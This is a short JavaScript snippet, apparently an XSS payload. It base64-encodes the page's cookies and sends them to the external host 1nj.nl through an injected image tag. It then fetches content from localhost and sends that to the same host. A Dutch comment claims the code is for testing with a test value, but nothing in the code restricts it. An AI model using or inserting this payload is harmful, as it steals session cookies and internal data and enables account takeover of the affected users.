data = btoa(document.cookie)
document.write('<img src="https://1nj.nl/?c=' + data + '"></img');

async function test() {
  const response = await fetch('https://localhost');
  const data = await response.text();

  // Test alleen met een expliciete testwaarde
  const encoded = encodeURIComponent(btoa(data));
  document.write('<img src="https://1nj.nl/?d=' + encoded + '"></img');
}

test();
